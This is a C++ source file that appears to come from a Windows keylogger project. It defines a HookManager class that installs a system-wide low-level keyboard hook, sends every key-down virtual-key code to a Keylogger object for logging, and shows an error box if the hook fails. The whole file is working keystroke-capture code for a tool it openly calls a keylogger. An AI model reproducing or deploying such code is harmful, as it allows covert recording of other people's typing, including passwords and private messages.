#include "../../include/hook_manager.h"
#include "../../include/keylogger.h"

HHOOK HookManager::_hook = nullptr;
Keylogger* HookManager::_keylogger = nullptr;

void HookManager::InstallKeyboardHook(Keylogger* keylogger) {
    _keylogger = keylogger;
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, ListenerHookCallback, NULL, 0);

    if (!_hook) {
        displayErrorMessage();
    }
}

LRESULT __stdcall HookManager::ListenerHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            _keylogger->LogKeyStroke(kbdStruct.vkCode);
        }
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void HookManager::ReleaseHook() {
    UnhookWindowsHookEx(_hook);
}

void HookManager::displayErrorMessage() {
    LPCWSTR errorMessage = L"Failed to install hook!";
    LPCWSTR errorTitle = L"Error";

    MessageBoxW(NULL, errorMessage, errorTitle, MB_ICONERROR);
}